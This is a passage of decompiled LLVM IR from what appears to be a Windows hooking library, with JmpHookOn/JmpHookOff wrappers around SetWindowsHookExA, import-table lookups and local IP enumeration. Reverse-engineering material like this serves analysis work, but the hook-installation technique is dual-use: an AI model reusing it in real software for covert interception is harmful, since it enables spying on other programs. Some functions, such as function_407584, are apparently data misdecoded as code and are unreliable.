  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 3 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1882
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1883
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1884
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1884
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1885
  %23 = call i32 @function_4073f8(), !insn.addr !1886
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1886
  br label %dec_label_pc_4073bb, !insn.addr !1886

dec_label_pc_4073bb:                              ; preds = %dec_label_pc_407347, %dec_label_pc_407340, %dec_label_pc_407314
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1887
  %25 = load i32, i32* %24, align 4, !insn.addr !1887
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1888
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1889
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1889
  store i32 4223960, i32* %27, align 4, !insn.addr !1889
  %28 = call i32 @"@LStrClr"(), !insn.addr !1890
  ret i32 %28, !insn.addr !1891
}

define i32 @function_4073d1() local_unnamed_addr {
dec_label_pc_4073d1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1892
  ret i32 %0, !insn.addr !1892
}

define i32 @function_4073d6() local_unnamed_addr {
dec_label_pc_4073d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1893
}

define i32 @function_4073d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4073d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1894
}

define i32 @function_4073f8() local_unnamed_addr {
dec_label_pc_4073f8:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1895
  %1 = call i32 @"@LStrClr"(), !insn.addr !1896
  ret i32 %1, !insn.addr !1897
}

define i32 @function_407410() local_unnamed_addr {
dec_label_pc_407410:
  %eax.0.reg2mem = alloca i32, !insn.addr !1898
  %esp.0.reg2mem = alloca i32, !insn.addr !1898
  %esp.15.reg2mem = alloca i32, !insn.addr !1898
  %storemerge6.reg2mem = alloca i32, !insn.addr !1898
  %.reg2mem = alloca i32, !insn.addr !1898
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1898
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1899
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1900
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1901
  %5 = call i32 @"@LStrClr"(), !insn.addr !1902
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1903
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1903
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1904
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1905
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1906
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1906
  %11 = icmp eq %hostent* %9, null, !insn.addr !1907
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1908
  br i1 %11, label %dec_label_pc_40746e, label %dec_label_pc_407448, !insn.addr !1908

dec_label_pc_407448:                              ; preds = %dec_label_pc_407410
  %12 = add i32 %10, 12, !insn.addr !1909
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1909
  %14 = load i32, i32* %13, align 4, !insn.addr !1909
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1910
  %16 = load i32, i32* %15, align 4, !insn.addr !1910
  %17 = icmp eq i32 %16, 0, !insn.addr !1911
  %18 = icmp eq i1 %17, false, !insn.addr !1912
  br i1 %18, label %dec_label_pc_40744f.lr.ph, label %dec_label_pc_407469, !insn.addr !1912

dec_label_pc_40744f.lr.ph:                        ; preds = %dec_label_pc_407448
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1905
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_40744f

dec_label_pc_40744f:                              ; preds = %dec_label_pc_40744f.lr.ph, %dec_label_pc_407461
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1913
  %21 = icmp eq i1 %20, false, !insn.addr !1914
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1914
  br i1 %21, label %dec_label_pc_407461, label %dec_label_pc_407453, !insn.addr !1914

dec_label_pc_407453:                              ; preds = %dec_label_pc_40744f
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1915
  %23 = load i32, i32* %22, align 4, !insn.addr !1915
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1915
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1915
  store i32 %23, i32* %25, align 4, !insn.addr !1915
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1916
  %27 = call i32 @StrPas(), !insn.addr !1917
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1917
  br label %dec_label_pc_407461, !insn.addr !1917

dec_label_pc_407461:                              ; preds = %dec_label_pc_407453, %dec_label_pc_40744f
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1918
  %29 = mul i32 %28, 4, !insn.addr !1910
  %30 = add i32 %29, %14, !insn.addr !1910
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1910
  %32 = load i32, i32* %31, align 4, !insn.addr !1910
  %33 = icmp eq i32 %32, 0, !insn.addr !1911
  %34 = icmp eq i1 %33, false, !insn.addr !1912
  store i32 %32, i32* %.reg2mem, !insn.addr !1912
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1912
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1912
  br i1 %34, label %dec_label_pc_40744f, label %dec_label_pc_407469, !insn.addr !1912

dec_label_pc_407469:                              ; preds = %dec_label_pc_407461, %dec_label_pc_407448
  %35 = call i32 @WSACleanup(), !insn.addr !1919
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1919
  br label %dec_label_pc_40746e, !insn.addr !1919

dec_label_pc_40746e:                              ; preds = %dec_label_pc_407469, %dec_label_pc_407410
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1920
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1921
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1921
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1921
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1922
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1923
  %3 = add i32 %2, 1, !insn.addr !1923
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1923
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1924
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1925
  ret i32 0, !insn.addr !1926
}

define i32 @function_4074a1() local_unnamed_addr {
dec_label_pc_4074a1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1927
  ret i32 %0, !insn.addr !1927
}

define i32 @function_4074a6() local_unnamed_addr {
dec_label_pc_4074a6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1928
}

define i32 @function_4074a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1929
}

define i32 @function_4074ac() local_unnamed_addr {
dec_label_pc_4074ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1930
  %2 = add i32 %1, -1, !insn.addr !1930
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1930
  ret i32 %0, !insn.addr !1931
}

define i32 @function_4074b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1932
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1932
  ret i32 %2, !insn.addr !1933
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_4074d4:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224180 to i32*), i32 3), !insn.addr !1934
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1934
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1935
  %3 = icmp eq i32* %1, null, !insn.addr !1936
  %4 = icmp eq i1 %3, false, !insn.addr !1937
  %5 = sext i1 %4 to i32, !insn.addr !1938
  ret i32 %5, !insn.addr !1939
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407500:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1940
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1941
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1941
  %3 = sext i1 %2 to i32, !insn.addr !1941
  ret i32 %3, !insn.addr !1942
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1943
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1943
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1943
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1944
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1945
  %3 = add i32 %2, 1, !insn.addr !1945
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1945
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1946
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1947
  ret i32 0, !insn.addr !1948
}

define i32 @function_407531() local_unnamed_addr {
dec_label_pc_407531:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1949
  ret i32 %0, !insn.addr !1949
}

define i32 @function_407536() local_unnamed_addr {
dec_label_pc_407536:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1950
}

define i32 @function_407538(i32 %arg1) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1951
}

define i32 @function_40753c() local_unnamed_addr {
dec_label_pc_40753c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1952
  %2 = add i32 %1, -1, !insn.addr !1952
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1952
  ret i32 %0, !insn.addr !1953
}

define i32* @function_407544(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_407544:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1954
  ret i32* %0, !insn.addr !1954
}

define i32 @function_40754c() local_unnamed_addr {
dec_label_pc_40754c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1955
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1955
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1955
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1956
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1957
  %3 = add i32 %2, 1, !insn.addr !1957
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1957
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1958
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1959
  ret i32 0, !insn.addr !1960
}

define i32 @function_407571() local_unnamed_addr {
dec_label_pc_407571:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1961
  ret i32 %0, !insn.addr !1961
}

define i32 @function_407576() local_unnamed_addr {
dec_label_pc_407576:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1962
}

define i32 @function_407578(i32 %arg1) local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1963
}

define i32 @function_40757c() local_unnamed_addr {
dec_label_pc_40757c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1964
  %2 = add i32 %1, -1, !insn.addr !1964
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1964
  ret i32 %0, !insn.addr !1965
}

define i32 @function_407584() local_unnamed_addr {
dec_label_pc_407584:
  %esp.2.reg2mem = alloca i32, !insn.addr !1966
  %ebp.1.reg2mem = alloca i32, !insn.addr !1966
  %esp.1.reg2mem = alloca i32, !insn.addr !1966
  %ebp.0.reg2mem = alloca i32, !insn.addr !1966
  %esp.0.reg2mem = alloca i32, !insn.addr !1966
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %5 = add i32 %1, 64, !insn.addr !1966
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1966
  %7 = load i8, i8* %6, align 1, !insn.addr !1966
  %8 = mul i8 %7, 2, !insn.addr !1966
  store i8 %8, i8* %6, align 1, !insn.addr !1966
  %9 = bitcast i32* %eax to i8*
  %10 = load i8, i8* %9, align 4, !insn.addr !1967
  %11 = load i32, i32* %eax, align 4
  %12 = trunc i32 %11 to i8, !insn.addr !1967
  %13 = add i8 %10, %12, !insn.addr !1967
  %14 = inttoptr i32 %11 to i8*, !insn.addr !1967
  store i8 %13, i8* %14, align 1, !insn.addr !1967
  %15 = load i8, i8* %9, align 4, !insn.addr !1968
  %16 = load i32, i32* %eax, align 4
  %17 = trunc i32 %16 to i8, !insn.addr !1968
  %18 = add i8 %15, %17, !insn.addr !1968
  %19 = inttoptr i32 %16 to i8*, !insn.addr !1968
  store i8 %18, i8* %19, align 1, !insn.addr !1968
  %20 = load i8, i8* %9, align 4, !insn.addr !1969
  %21 = load i32, i32* %eax, align 4
  %22 = trunc i32 %21 to i8, !insn.addr !1969
  %23 = add i8 %20, %22, !insn.addr !1969
  %24 = inttoptr i32 %21 to i8*, !insn.addr !1969
  store i8 %23, i8* %24, align 1, !insn.addr !1969
  %25 = load i8, i8* %9, align 4, !insn.addr !1970
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !1970
  %28 = add i8 %25, %27, !insn.addr !1970
  %29 = inttoptr i32 %26 to i8*, !insn.addr !1970
  store i8 %28, i8* %29, align 1, !insn.addr !1970
  %30 = load i8, i8* %9, align 4, !insn.addr !1971
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !1971
  %33 = add i8 %30, %32, !insn.addr !1971
  %34 = inttoptr i32 %31 to i8*, !insn.addr !1971
  store i8 %33, i8* %34, align 1, !insn.addr !1971
  %35 = load i8, i8* %9, align 4, !insn.addr !1972
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !1972
  %38 = add i8 %35, %37, !insn.addr !1972
  %39 = inttoptr i32 %36 to i8*, !insn.addr !1972
  store i8 %38, i8* %39, align 1, !insn.addr !1972
  %40 = load i8, i8* %9, align 4, !insn.addr !1973
  %41 = load i32, i32* %eax, align 4
  %42 = trunc i32 %41 to i8, !insn.addr !1973
  %43 = add i8 %40, %42, !insn.addr !1973
  %44 = inttoptr i32 %41 to i8*, !insn.addr !1973
  store i8 %43, i8* %44, align 1, !insn.addr !1973
  %45 = load i8, i8* %9, align 4, !insn.addr !1974
  %46 = load i32, i32* %eax, align 4
  %47 = trunc i32 %46 to i8, !insn.addr !1974
  %48 = add i8 %45, %47, !insn.addr !1974
  %49 = inttoptr i32 %46 to i8*, !insn.addr !1974
  store i8 %48, i8* %49, align 1, !insn.addr !1974
  %50 = load i8, i8* %9, align 4, !insn.addr !1975
  %51 = load i32, i32* %eax, align 4
  %52 = trunc i32 %51 to i8, !insn.addr !1975
  %53 = add i8 %50, %52, !insn.addr !1975
  %54 = inttoptr i32 %51 to i8*, !insn.addr !1975
  store i8 %53, i8* %54, align 1, !insn.addr !1975
  %55 = load i8, i8* %9, align 4, !insn.addr !1976
  %56 = load i32, i32* %eax, align 4
  %57 = trunc i32 %56 to i8, !insn.addr !1976
  %58 = add i8 %55, %57, !insn.addr !1976
  %59 = inttoptr i32 %56 to i8*, !insn.addr !1976
  store i8 %58, i8* %59, align 1, !insn.addr !1976
  %60 = load i8, i8* %9, align 4, !insn.addr !1977
  %61 = load i32, i32* %eax, align 4
  %62 = trunc i32 %61 to i8, !insn.addr !1977
  %63 = add i8 %60, %62, !insn.addr !1977
  %64 = inttoptr i32 %61 to i8*, !insn.addr !1977
  store i8 %63, i8* %64, align 1, !insn.addr !1977
  %65 = load i8, i8* %9, align 4, !insn.addr !1978
  %66 = load i32, i32* %eax, align 4
  %67 = trunc i32 %66 to i8, !insn.addr !1978
  %68 = add i8 %65, %67, !insn.addr !1978
  %69 = inttoptr i32 %66 to i8*, !insn.addr !1978
  store i8 %68, i8* %69, align 1, !insn.addr !1978
  %70 = load i8, i8* %9, align 4, !insn.addr !1979
  %71 = load i32, i32* %eax, align 4
  %72 = trunc i32 %71 to i8, !insn.addr !1979
  %73 = add i8 %70, %72, !insn.addr !1979
  %74 = inttoptr i32 %71 to i8*, !insn.addr !1979
  store i8 %73, i8* %74, align 1, !insn.addr !1979
  %75 = load i8, i8* %9, align 4, !insn.addr !1980
  %76 = load i32, i32* %eax, align 4
  %77 = trunc i32 %76 to i8, !insn.addr !1980
  %78 = add i8 %75, %77, !insn.addr !1980
  %79 = inttoptr i32 %76 to i8*, !insn.addr !1980
  store i8 %78, i8* %79, align 1, !insn.addr !1980
  %80 = load i32, i32* %eax, align 4, !insn.addr !1981
  %81 = trunc i32 %80 to i8, !insn.addr !1981
  %82 = trunc i32 %3 to i8, !insn.addr !1981
  %83 = add i8 %81, %82, !insn.addr !1981
  %84 = icmp eq i8 %83, 0, !insn.addr !1981
  %85 = zext i8 %83 to i32, !insn.addr !1981
  %86 = and i32 %80, -256, !insn.addr !1981
  %87 = or i32 %86, %85, !insn.addr !1981
  store i32 %87, i32* %eax, align 4, !insn.addr !1981
  %88 = icmp eq i1 %84, false, !insn.addr !1982
  br i1 %88, label %dec_label_pc_4075e7, label %dec_label_pc_4075a7, !insn.addr !1982

dec_label_pc_4075a7:                              ; preds = %dec_label_pc_407584
  %89 = mul i32 %87, 2, !insn.addr !1983
  %90 = inttoptr i32 %89 to i8*, !insn.addr !1983
  %91 = load i8, i8* %90, align 2, !insn.addr !1983
  %92 = trunc i32 %2 to i8, !insn.addr !1983
  %93 = add i8 %91, %92, !insn.addr !1983
  store i8 %93, i8* %90, align 2, !insn.addr !1983
  %94 = load i32, i32* %eax, align 4
  %95 = inttoptr i32 %94 to i8*, !insn.addr !1984
  %96 = load i8, i8* %95, align 1, !insn.addr !1984
  %97 = trunc i32 %94 to i8, !insn.addr !1984
  %98 = add i8 %96, %97, !insn.addr !1984
  store i8 %98, i8* %95, align 1, !insn.addr !1984
  %99 = load i32, i32* %eax, align 4
  %100 = or i32 %99, 16, !insn.addr !1985
  %101 = add i32 %1, 717226048, !insn.addr !1986
  %102 = add i32 %101, %3, !insn.addr !1986
  %103 = inttoptr i32 %102 to i8*, !insn.addr !1986
  %104 = load i8, i8* %103, align 1, !insn.addr !1986
  %105 = udiv i32 %3, 256, !insn.addr !1986
  %106 = trunc i32 %105 to i8, !insn.addr !1986
  %107 = add i8 %104, %106, !insn.addr !1986
  store i8 %107, i8* %103, align 1, !insn.addr !1986
  %108 = add i32 %100, 2, !insn.addr !1987
  %109 = mul i32 %108, 257
  %110 = and i32 %109, 65280, !insn.addr !1988
  %111 = and i32 %108, -65281, !insn.addr !1988
  %112 = or i32 %110, %111, !insn.addr !1988
  %113 = trunc i32 %108 to i8, !insn.addr !1989
  %114 = inttoptr i32 %112 to i8*, !insn.addr !1989
  %115 = load i8, i8* %114, align 1, !insn.addr !1989
  %116 = sub i8 %113, %115, !insn.addr !1989
  %117 = zext i8 %116 to i32, !insn.addr !1989
  %118 = and i32 %112, -256, !insn.addr !1989
  %119 = or i32 %118, %117, !insn.addr !1989
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1990
  %121 = load i32, i32* %120, align 4, !insn.addr !1990
  %122 = sub i32 %121, %119, !insn.addr !1990
  store i32 %122, i32* %120, align 4, !insn.addr !1990
  %123 = udiv i8 %116, 41, !insn.addr !1991
  %124 = urem i8 %116, 41, !insn.addr !1991
  %125 = zext i8 %124 to i32, !insn.addr !1991
  %126 = zext i8 %123 to i32, !insn.addr !1991
  %127 = mul i32 %126, 256, !insn.addr !1991
  %.masked = and i32 %108, -65536
  %128 = or i32 %.masked, %125, !insn.addr !1991
  %129 = or i32 %128, %127, !insn.addr !1991
  %130 = add nsw i32 %129, 119, !insn.addr !1992
  %131 = inttoptr i32 %130 to i8*, !insn.addr !1992
  %132 = load i8, i8* %131, align 1, !insn.addr !1992
  %133 = udiv i32 %4, 256, !insn.addr !1992
  %134 = trunc i32 %133 to i8, !insn.addr !1992
  %135 = add i8 %132, %134, !insn.addr !1992
  store i8 %135, i8* %131, align 1, !insn.addr !1992
  %136 = add nsw i32 %129, 2, !insn.addr !1993
  %137 = inttoptr i32 %136 to i8*, !insn.addr !1994
  %138 = load i8, i8* %137, align 1, !insn.addr !1994
  %139 = trunc i32 %4 to i8, !insn.addr !1994
  %140 = add i8 %138, %139, !insn.addr !1994
  store i8 %140, i8* %137, align 1, !insn.addr !1994
  store i32 -1207943126, i32* inttoptr (i32 -1207943130 to i32*), align 4, !insn.addr !1995
  %141 = trunc i32 %3 to i16, !insn.addr !1996
  call void @__asm_outsd(i16 %141, i32 %0), !insn.addr !1996
  call void @__asm_outsd(i16 %141, i32 %0), !insn.addr !1997
  %142 = add i32 %4, 80, !insn.addr !1998
  %143 = inttoptr i32 %142 to i32*, !insn.addr !1998
  %144 = load i32, i32* %143, align 4, !insn.addr !1998
  %145 = mul i32 %144, 73, !insn.addr !1998
  store i32 %145, i32* %eax, align 4, !insn.addr !1999
  %146 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !2000
  store i32 %146, i32* inttoptr (i32 -1207943134 to i32*), align 4, !insn.addr !2000
  %147 = icmp eq i8 %82, 0, !insn.addr !2001
  store i32 -1207943150, i32* %esp.0.reg2mem, !insn.addr !2002
  store i32 -1207943134, i32* %ebp.0.reg2mem, !insn.addr !2002
  store i32 -1207943154, i32* %esp.1.reg2mem, !insn.addr !2002
  store i32 -1207943134, i32* %ebp.1.reg2mem, !insn.addr !2002
  br i1 %147, label %dec_label_pc_4075ef, label %dec_label_pc_4075e7, !insn.addr !2002

dec_label_pc_4075e7:                              ; preds = %dec_label_pc_4075a7, %dec_label_pc_407584
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %148 = call i32 @"@ClassCreate"(), !insn.addr !2003
  store i32 %148, i32* %eax, align 4, !insn.addr !2003
  %phitmp = add i32 %esp.0.reload, -20
  store i32 %phitmp, i32* %esp.1.reg2mem, !insn.addr !2003
  store i32 %ebp.0.reload, i32* %ebp.1.reg2mem, !insn.addr !2003
  br label %dec_label_pc_4075ef, !insn.addr !2003

dec_label_pc_4075ef:                              ; preds = %dec_label_pc_4075e7, %dec_label_pc_4075a7
  %ebp.1.reload = load i32, i32* %ebp.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %149 = add i32 %ebp.1.reload, -1, !insn.addr !2004
  %150 = inttoptr i32 %149 to i8*, !insn.addr !2004
  store i8 %82, i8* %150, align 1, !insn.addr !2004
  %151 = load i32, i32* %eax, align 4, !insn.addr !2005
  %152 = add i32 %ebp.1.reload, 16, !insn.addr !2006
  %153 = inttoptr i32 %152 to i32*, !insn.addr !2006
  %154 = load i32, i32* %153, align 4, !insn.addr !2006
  %155 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !2007
  %156 = ptrtoint i32* %155 to i32, !insn.addr !2007
  %157 = add i32 %151, 8, !insn.addr !2008
  %158 = inttoptr i32 %157 to i32*, !insn.addr !2008
  store i32 %156, i32* %158, align 4, !insn.addr !2008
  %159 = icmp eq i32* %155, null, !insn.addr !2009
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2010
  br i1 %159, label %dec_label_pc_407647, label %dec_label_pc_40760b, !insn.addr !2010

dec_label_pc_40760b:                              ; preds = %dec_label_pc_4075ef
  %160 = add i32 %151, 12, !insn.addr !2011
  %161 = inttoptr i32 %160 to i32*, !insn.addr !2011
  store i32 %154, i32* %161, align 4, !insn.addr !2011
  %162 = add i32 %ebp.1.reload, 12, !insn.addr !2012
  %163 = inttoptr i32 %162 to i32*, !insn.addr !2012
  %164 = load i32, i32* %163, align 4, !insn.addr !2012
  %165 = add i32 %151, 16, !insn.addr !2013
  %166 = inttoptr i32 %165 to i32*, !insn.addr !2013
  store i32 %164, i32* %166, align 4, !insn.addr !2013
  %167 = add i32 %ebp.1.reload, 8, !insn.addr !2014
  %168 = inttoptr i32 %167 to i32*, !insn.addr !2014
  %169 = load i32, i32* %168, align 4, !insn.addr !2014
  %170 = add i32 %151, 20, !insn.addr !2015
  %171 = inttoptr i32 %170 to i32*, !insn.addr !2015
  store i32 %169, i32* %171, align 4, !insn.addr !2015
  %172 = load i32, i32* %166, align 4, !insn.addr !2016
  %173 = add i32 %esp.1.reload, -4, !insn.addr !2017
  %174 = inttoptr i32 %173 to i32*, !insn.addr !2017
  store i32 %172, i32* %174, align 4, !insn.addr !2017
  %175 = add i32 %esp.1.reload, -8, !insn.addr !2018
  %176 = inttoptr i32 %175 to i32*, !insn.addr !2018
  store i32 %154, i32* %176, align 4, !insn.addr !2018
  %177 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !2019
  %178 = ptrtoint i32* %177 to i32, !insn.addr !2019
  %179 = add i32 %esp.1.reload, -12, !insn.addr !2020
  %180 = inttoptr i32 %179 to i32*, !insn.addr !2020
  store i32 %178, i32* %180, align 4, !insn.addr !2020
  %181 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2021
  %182 = ptrtoint i32 ()* %181 to i32, !insn.addr !2021
  %183 = add i32 %151, 24, !insn.addr !2022
  %184 = inttoptr i32 %183 to i32*, !insn.addr !2022
  store i32 %182, i32* %184, align 4, !insn.addr !2022
  %185 = icmp eq i32 ()* %181, null, !insn.addr !2023
  store i32 %179, i32* %esp.2.reg2mem, !insn.addr !2024
  br i1 %185, label %dec_label_pc_407647, label %dec_label_pc_407633, !insn.addr !2024

dec_label_pc_407633:                              ; preds = %dec_label_pc_40760b
  %186 = load i32, i32* %171, align 4, !insn.addr !2025
  %187 = add i32 %esp.1.reload, -16, !insn.addr !2026
  %188 = inttoptr i32 %187 to i32*, !insn.addr !2026
  store i32 %186, i32* %188, align 4, !insn.addr !2026
  %189 = load i32, i32* %158, align 4, !insn.addr !2027
  %190 = add i32 %esp.1.reload, -20, !insn.addr !2028
  %191 = inttoptr i32 %190 to i32*, !insn.addr !2028
  store i32 %189, i32* %191, align 4, !insn.addr !2028
  %192 = call i32 @function_4076b0(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2029
  store i32 %190, i32* %esp.2.reg2mem, !insn.addr !2029
  br label %dec_label_pc_407647, !insn.addr !2029

dec_label_pc_407647:                              ; preds = %dec_label_pc_407633, %dec_label_pc_40760b, %dec_label_pc_4075ef
  %193 = load i8, i8* %150, align 1, !insn.addr !2030
  %194 = icmp eq i8 %193, 0, !insn.addr !2030
  br i1 %194, label %dec_label_pc_40765e, label %dec_label_pc_40764f, !insn.addr !2031

dec_label_pc_40764f:                              ; preds = %dec_label_pc_407647
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %195 = call i32 @function_402b48(), !insn.addr !2032
  %196 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2033
